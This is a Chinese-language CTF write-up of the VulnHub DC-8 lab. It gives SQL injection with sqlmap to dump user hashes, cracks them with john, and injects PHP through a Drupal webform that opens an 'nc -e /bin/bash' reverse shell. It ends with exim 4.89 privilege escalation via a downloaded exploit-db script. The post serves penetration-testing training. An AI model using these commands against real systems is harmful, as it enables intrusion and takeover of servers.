---
title: DC-8复现
permalink: /archives/54148/
published: 2022-12-01 14:57:00
tags: 
  - vulnhub
  - 渗透测试
---

# DC-8复现

## 描述

> DC-8是另一个专门建造的易受攻击的实验室，旨在获得渗透测试领域的经验。
>
> 这个挑战有点混合，既是实际挑战，又是关于在Linux上安装和配置的双因素身份验证是否可以防止Linux服务器被利用的“概念证明”。
>
> 这个挑战的“概念验证”部分是由于Twitter上被问到一个关于双因素身份验证和Linux的问题，也是由于@theart42的建议。
>
> 此挑战的最终目标是绕过双因素身份验证，获取root并读取唯一的标志。
>
> 除非您尝试通过SSH登录，否则您甚至可能不知道安装和配置了双因素身份验证，但它肯定在那里并且正在做它的工作。
>
> Linux 技能和对 Linux 命令行的熟悉是必须的，对基本渗透测试工具的一些经验也是必须的。
>
> 对于初学者来说，谷歌可以提供很大的帮助，但你总是可以在@DCAU7发推文给我寻求帮助，让你再次前进。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。

## 信息收集

确认目标机器的IP以及开启的端口

![image-20221201150628772](./images/image-20221201150628772.png)

访问80端口，点击welcome to DC-8发现这个url有点问题，猜想有sql注入

![image-20221201151645623](./images/image-20221201151645623.png)

扫描目录看看有没有登录口

```bash
dirsearch -u 192.168.71.130 -e * -x 403 --random-agent
```

![image-20221201160557499](./images/image-20221201160557499.png)

## SQl注入

在nid参数后面加入一个`'`后出现了sql报错直接**sqlmap**跑一下

### 爆破数据库

```bash
sqlmap -u "http://192.168.71.130/?nid=1" --dbs
```

得到两个库，其中`information_schema`是为了提供了访问数据库元数据的方式，所以可以暂时忽略

![image-20221201152316983](./images/image-20221201152316983.png)



### 爆破表

```bash
sqlmap -u "http://192.168.71.130/?nid=1" -D d7db --tables
```

一共88个表，包含有**users**表，

![image-20221201153542043](./images/image-20221201153542043.png)

![image-20221201153559541](./images/image-20221201153559541.png)

### 爆破列

```bash
sqlmap -u "http://192.168.71.130/?nid=1" -D d7db -T users --columns
```

得到16列

![image-20221201153635852](./images/image-20221201153635852.png)

### 爆破字段名

```bash
sqlmap -u "http://192.168.71.130/?nid=1" -D d7db -T users -C name,pass,uid --dump
```

得到两个用户名和经过加密的密码，将密码保存好，利用**john**进行爆破

![image-20221201154123064](./images/image-20221201154123064.png)

## 爆破密码

```bash
john dc8_pass.txt
```

爆出一个：turtle

![image-20221201154620496](./images/image-20221201154620496.png)

## 登录后台

爆出密码后尝试利用登录，前面信息收集的时候就有发现其登录入口，经过测试，发现爆破出来的是john的密码

![image-20221201160940053](./images/image-20221201160940053.png)

在`Content->Contact Us->Webform->Form settings`里发现有可利用点，可以写入php代码

![image-20221201161518710](./images/image-20221201161518710.png)

## 反弹shell

编写php文件直接执行命令反弹shell

```php
<?php
exec("nc -e /bin/bash 192.168.71.128 6666");
?> 
```

反弹成功

![image-20221201162252984](./images/image-20221201162252984.png)

切换交互式shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## 提权

find查找suid权限的命令

```bash
find / -perm -4000 -print 2>/dev/null
```

![image-20221201162431555](./images/image-20221201162431555.png)

其中的exim4是可利用进行提权的

首先查看exim4的版本

![image-20221201162654433](./images/image-20221201162654433.png)

搜索exim 4.89的漏洞

![image-20221201162930425](./images/image-20221201162930425.png)

复制文件到当前目录

```bash
cp /usr/share/exploitdb/exploits/linux/local/46996.sh hack.sh  
```

利用python起http服务进行传输

```bash
python -m http.server 6666
```

进入tmp文件夹下载文件

```bash
cd /tmp	//tmp文件夹
wget 192.168.71.128:6666/hack.sh	//下载目标文件
```

![image-20221201163259748](./images/image-20221201163259748.png)

但是这个文件是不可执行的，所以要对其赋予执行权限

```
ls -l	//查看当前目录下的所有文件权限
chmod 777 hack.sh	//赋予文件可读、可写和可执行权限
```

![image-20221201163421012](./images/image-20221201163421012.png)

脚本有两种方式，使用第二种利用**netcat**再次进行反弹shell

```bash
./hack.sh -m netcat		//执行脚本
nc -e /bin/bash 192.168.71.128 31337		//反弹shell
```

![image-20221201164356827](./images/image-20221201164356827.png)

## flag

进到根目录下找到flag

![image-20221201164614977](./images/image-20221201164614977.png)